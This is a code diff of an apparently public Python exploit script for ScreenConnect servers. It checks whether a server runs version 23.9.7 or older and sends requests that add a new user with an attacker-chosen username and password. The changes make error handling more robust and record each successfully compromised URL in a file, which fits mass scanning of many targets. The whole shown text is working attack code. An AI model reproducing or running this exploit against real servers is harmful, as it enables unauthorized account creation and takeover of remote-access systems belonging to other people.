@@ -41,16 +41,22 @@ def exploit(url, username, password, domain):
             check_response = requests.post(url=check_url, data=check_data, headers=check_header, verify=False)
             if check_response.ok and "1" in check_response.text:
                 print(f"[+] {url} Successfully added user. username: {GREEN}{username}{RESET} and password: {GREEN}{password}{RESET}")
+                with open("success.txt", "a+") as success_file:
+                    success_file.write(url + "\n")
+                success_file.close()
         except:
             pass
 
 def checkVersion(url):
-    response = requests.get(url=url + "/Login?Reason=0", headers=exploit_header, verify=False)
-    serverString = response.headers["Server"]
-    version = re.search(r"ScreenConnect\/([\d\.]+)-\d+", serverString).group(1)
-    if LooseVersion(version) <= LooseVersion("23.9.7"):
-        return True
-    else:
+    try:
+        response = requests.get(url=url + "/Login?Reason=0", headers=exploit_header, verify=False)
+        serverString = response.headers["Server"]
+        version = re.search(r"ScreenConnect\/([\d\.]+)-\d+", serverString).group(1)
+        if LooseVersion(version) <= LooseVersion("23.9.7"):
+            return True
+        else:
+            return False
+    except:
         return False
 
 def main():
